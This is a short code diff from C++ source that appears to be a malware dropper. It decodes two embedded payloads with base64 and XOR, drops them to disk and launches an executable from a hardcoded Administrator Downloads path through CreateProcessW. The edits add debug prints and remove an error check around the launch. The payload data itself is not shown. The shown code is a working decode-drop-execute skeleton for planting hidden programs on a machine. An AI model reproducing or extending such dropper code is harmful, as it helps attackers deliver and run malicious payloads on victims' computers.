@@ -141,6 +141,8 @@ int main(int argc, char* argv[])
 		dropper_start(1);
 		dropper_start(2);
 
+		printf("after dropper start");
+
 	#if DROPPER_BASE64 == 1
 		data1 = base64decode(data1, &size1);
 		data2 = base64decode(data2, &size2);
@@ -150,6 +152,7 @@ int main(int argc, char* argv[])
 		data1 = XOR(data1, size1);
 		data2 = XOR(data2, size2);
 	#endif
+		printf("after decode stop");
 
 		drop(size1, data1, name1);
 		drop(size2, data2, name2);
@@ -489,10 +492,7 @@ void exe_launch(std::wstring run_exe)
 	// call directly
 #else
 	std::wstring cmdW = L"C:\\Users\\Administrator\\Downloads\\exe_num28.exe";
-	if (!CreateProcessW( cmdW.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &siw, &piw)) {
-		printf("1");
-	}
-
+	CreateProcessW( cmdW.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &siw, &piw);
 //	std::string cmdA = "C:\\Users\\Administrator\\Downloads\\exe_num28.exe";
 //	CreateProcessA( cmdA.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &sia, &pia);
 	return true;
